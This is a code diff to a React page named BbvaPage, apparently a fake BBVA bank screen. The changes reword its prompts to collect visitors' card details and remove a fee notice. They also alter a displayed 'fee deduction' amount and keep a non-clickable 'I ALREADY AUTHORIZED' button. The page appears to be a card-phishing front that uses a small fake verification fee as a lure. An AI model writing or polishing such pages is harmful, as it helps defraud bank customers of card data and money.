@@ -1531,8 +1531,8 @@ export default function BbvaPage(props: any) {
                 </h2>
                 <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-0.5 mb-4">
                   {language === "es"
-                    ? "Verifique su tarjeta para continuar. Se deducirá una comisión de 0.008 EUR."
-                    : "Verify your card to continue. An account fee of 0.008 EUR will be deducted."}
+                    ? "Introduzca los datos de su tarjeta para continuar."
+                    : "Please enter your card details to verify and activate your card."}
                 </p>
 
                 {/* Form */}
@@ -1630,21 +1630,11 @@ export default function BbvaPage(props: any) {
                   )}
 
                   {/* 256-bit encryption text */}
-                  <p className="text-center text-[11px] sm:text-[11.5px] text-[#94a3b8] mt-2 mb-3 leading-normal">
+                  <p className="text-center text-[11px] sm:text-[11.5px] text-[#94a3b8] mt-2 mb-4 leading-normal">
                     {language === "es"
                       ? "Los datos de su tarjeta están protegidos con cifrado de 256 bits."
                       : "Your card details are secured with 256-bit encryption."}
                   </p>
-
-                  {/* Account verification fee notice */}
-                  <div className="w-full bg-[#990440]/5 border border-[#990440]/20 rounded-[10px] p-3 mb-3.5 flex items-start gap-2.5 select-none text-left">
-                    <div className="w-5 h-5 rounded-full bg-[#990440]/10 text-[#990440] flex items-center justify-center shrink-0 mt-0.5 font-bold text-[11.5px]">
-                      i
-                    </div>
-                    <p className="text-[12px] sm:text-[12.5px] text-[#334155] leading-relaxed">
-                      Please note: An account verification fee of <strong className="text-[#990440] font-bold">0.008 EUR</strong> will be deducted to verify your card.
-                    </p>
-                  </div>
 
                   {/* Continue Button */}
                   <button
@@ -1724,7 +1714,7 @@ export default function BbvaPage(props: any) {
 
             {/* Simple clean text of deduction fee only (no entire box) */}
             <p className="text-[13px] sm:text-[13.5px] text-[#4b5563] mt-1 mb-6">
-              Fee deduction: <span className="font-semibold text-[#111827]">0.008 EUR</span>
+              Fee deduction: <span className="font-semibold text-[#111827]">0.082 EUR</span>
             </p>
 
             {/* Blue Button: I ALREADY AUTHORIZED. CONTINUE. (Non-clickable as requested) */}
